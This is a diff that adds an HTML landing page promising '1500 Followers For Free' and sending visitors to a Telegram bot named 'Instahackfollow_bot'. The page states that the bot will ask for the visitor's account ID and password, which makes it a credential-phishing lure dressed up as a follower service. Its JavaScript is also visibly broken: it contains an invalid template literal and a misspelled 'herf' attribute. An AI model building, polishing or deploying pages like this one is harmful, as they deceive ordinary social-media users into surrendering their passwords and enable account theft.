@@ -1,0 +1,314 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Send Editing Request — Telegram Bot</title>
+
+  <!-- Google font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;500;700;900&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg1: linear-gradient(135deg,#0f172a 0%, #0b1220 45%, #071724 100%);
+      --accent: linear-gradient(90deg,#7c3aed,#06b6d4);
+      --glass: rgba(255,255,255,0.06);
+      --glass-2: rgba(255,255,255,0.04);
+      --white-trans: rgba(255,255,255,0.95);
+      font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      min-height:100vh;
+      background: var(--bg1);
+      color:#e6eef8;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:28px;
+    }
+
+    .card{
+      width:100%;
+      max-width:920px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius:18px;
+      padding:28px;
+      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
+      display:grid;
+      grid-template-columns: 1fr 420px;
+      gap:24px;
+      align-items:center;
+      backdrop-filter: blur(8px);
+      border: 1px solid rgba(255,255,255,0.03);
+    }
+
+    .left{
+      padding:8px 8px 8px 18px;
+    }
+
+    .eyebrow{
+      display:inline-block;
+      background: linear-gradient(90deg,#14b8a6,#7c3aed);
+      padding:6px 10px;
+      border-radius:999px;
+      font-weight:700;
+      font-size:13px;
+      color:white;
+      letter-spacing:0.2px;
+      margin-bottom:12px;
+    }
+
+    h1{
+      margin:4px 0 8px 0;
+      font-size:28px;
+      line-height:1.05;
+      letter-spacing:-0.3px;
+      color:var(--white-trans);
+    }
+
+    p.lead{
+      margin:0 0 18px 0;
+      color: #cfe9ff;
+      opacity:0.9;
+    }
+
+    .features{
+      display:flex;
+      gap:12px;
+      margin-top:12px;
+      flex-wrap:wrap;
+    }
+    .feat{
+      background:var(--glass);
+      border-radius:12px;
+      padding:10px 12px;
+      min-width:140px;
+      font-weight:600;
+      font-size:14px;
+      color:#e6f6ff;
+      display:flex;
+      gap:10px;
+      align-items:center;
+      border: 1px solid rgba(255,255,255,0.02);
+    }
+    .feat svg{width:18px;height:18px;opacity:0.95}
+
+    /* CTA column */
+    .right{
+      padding:18px;
+      display:flex;
+      flex-direction:column;
+      gap:14px;
+      align-items:center;
+      justify-content:center;
+      border-radius:12px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border: 1px solid rgba(255,255,255,0.03);
+      min-height:260px;
+    }
+
+    .bot-card{
+      width:100%;
+      display:flex;
+      gap:12px;
+      align-items:center;
+    }
+    .bot-avatar{
+      width:64px;
+      height:64px;
+      border-radius:14px;
+      
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-weight:900;
+      font-size:22px;
+      color:white;
+      box-shadow: 0 8px 20px rgba(7,10,25,0.6);
+    }
+    .bot-meta{
+      flex:1;
+      display:flex;
+      flex-direction:column;
+      gap:4px;
+    }
+    .bot-meta .name{
+      font-weight:800;
+      font-size:16px;
+      color:white;
+    }
+    .bot-meta .sub{
+      font-size:13px;
+      color:#d6eefb;
+      opacity:0.9;
+    }
+
+    .cta{
+      margin-top:6px;
+      width:100%;
+      display:flex;
+      gap:10px;
+    }
+
+    .btn{
+      flex:1;
+      padding:12px 14px;
+      border-radius:12px;
+      border: none;
+      font-weight:800;
+      font-size:15px;
+      cursor:pointer;
+      letter-spacing:0.2px;
+      color:white;
+      background: linear-gradient(90deg,#06b6d4,#7c3aed);
+      box-shadow: 0 8px 20px rgba(124,58,237,0.18);
+      transition: transform .14s ease, box-shadow .14s ease;
+    }
+    .btn:active{transform:translateY(1px)}
+    .btn.secondary{
+      background: transparent;
+      border: 1px solid rgba(255,255,255,0.06);
+      color:#dbeffd;
+      font-weight:700;
+      box-shadow:none;
+    }
+
+    .hint{
+      font-size:13px;
+      color:#bfe8ff;
+      opacity:0.9;
+      text-align:center;
+    }
+
+    /* nice footer */
+    .footer{
+      grid-column: 1 / -1;
+      margin-top:8px;
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      gap:12px;
+      color:#a9d9ff;
+      font-size:13px;
+      opacity:0.9;
+    }
+    .logo {
+  width: 50px; /* size of logo */
+  height: auto;
+  margin-bottom: 20px;
+  border-radius: 50%; /* makes it round if you want */
+  box-shadow: 0 4px 15px rgba(0,0,0,0.2); /* nice shadow */
+}
+
+    /* mobile */
+    @media (max-width:880px){
+      .card{grid-template-columns: 1fr; padding:18px;}
+      .right{order:-1}
+      .bot-avatar{width:56px;height:56px}
+    }
+  </style>
+</head>
+<body>
+  <div class="card" role="main">
+    <div class="left">
+      <span class="eyebrow">How to do</span>
+      <h1>Get 1500 Followers For Free</h1>
+      <p class="lead">Tap the button to open our Telegram bot. It will ask your id, and password — then we’ll receive the request instantly.</p>
+
+      <div class="features" aria-hidden="true">
+        <div class="feat">
+          <!-- icon -->
+          <svg viewBox="0 0 24 24" fill="none"><path d="M12 2v20" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Instant delivery
+        </div>
+        <div class="feat">
+          <svg viewBox="0 0 24 24" fill="none"><path d="M5 12h14" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          2-step form
+        </div>
+        <div class="feat">
+          <svg viewBox="0 0 24 24" fill="none"><path d="M12 6v6l4 2" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Fast replies
+        </div>
+      </div>
+
+      <div style="height:18px"></div>
+
+      <p style="margin:0 0 6px 0; font-weight:700">How it works</p>
+      <ol style="color:#cfe9ff; padding-left:18px; margin:6px 0 0 0; line-height:1.6">
+        <li>Open the bot by tapping the big button → (Get Now).</li>
+        <li>Bot will ask your <strong>ID</strong>, then <strong>Password</strong>.</li>
+        <li>Then It Will Send 1500 Followers To You Accout with in 48hours.</li>
+      </ol>
+    </div>
+
+    <div class="right">
+      <div class="bot-card" role="region" aria-label="Bot card">
+        <div class="bot-avatar">
+          <img class="logo" src="/Screenshot_20250809-141234_Google.jpg" alt="" />
+        </div>
+        <div class="bot-meta">
+          <div class="name">insta Followers</div>
+          <div class="sub">Fast & simple editing request</div>
+        </div>
+      </div>
+
+      <!-- Replace YOUR_BOT_USERNAME below (no @) -->
+      <div class="cta">
+        <a class="btn" id="openAppBtn" herf="https://t.me/Instahackfollow_bot">Open in App</a>
+        <a id="openWebBtn" class="btn secondary" href="https://t.me/Instahackfollow_bot" role="button" title="Open in Telegram Web">Open Web</a>
+      </div>
+
+      <div class="hint">If the app doesn't open, use "Open Web".</div>
+    </div>
+
+    <div class="footer">
+      <div>Made with ❤️ — Send requests via Telegram</div>
+      <div style="opacity:0.9">Bot: <strong id="botLabel">https://t.me/Instahackfollow_bot</strong></div>
+    </div>
+  </div>
+
+  <script>
+    // === CONFIG: replace this with your bot username (no @) ===
+    const BOT_USERNAME = "https://t.me/Instahackfollow_bot";
+    // optional: start payload (bot will receive /start payload)
+    const START_PAYLOAD = "from_landing";
+
+    // deep links
+    const tgAppLink = `tg://resolve?domain=${https://t.me/Instahackfollow_bot}&start=${START_PAYLOAD}`;
+    const tgWebLink = `https://t.me/Instahackfollow_bot/${BOT_USERNAME}?start=${START_PAYLOAD}`;
+
+    // set UI
+    document.getElementById("botLabel").textContent = "@" + BOT_USERNAME;
+    const openWebBtn = document.getElementById("openWebBtn");
+    openWebBtn.href = tgWebLink;
+
+    // Open app button: try opening the app scheme then fallback to web
+    document.getElementById("openAppBtn").addEventListener("click", function (e) {
+      // attempt app
+      const now = Date.now();
+      // create a hidden iframe (works on some browsers) or use location
+      window.location = tgAppLink;
+
+      // fallback: after 800ms redirect to web if still on page
+      setTimeout(function () {
+        // If still here, go to web link (this is best-effort)
+        if (Date.now() - now < 1500) {
+          window.location = tgWebLink;
+        }
+      }, 800);
+    });
+
+    // If BOT_USERNAME not changed, show instructive label
+    if (BOT_USERNAME === "YOUR_BOT_USERNAME") {
+      document.getElementById("openAppBtn").innerText = "Set bot username first";
+      document.getElementById("openAppBtn").disabled = true;
+      openWebBtn.classList.add("disabled");
+      openWebBtn.style.pointerEvents = "none";
+      openWebBtn.style.opacity = "0.6";
+      document.getElementById("botLabel").textContent = "@YOUR_BOT_USERNAME";
+    }
+  </script>
+</body>
+</html>
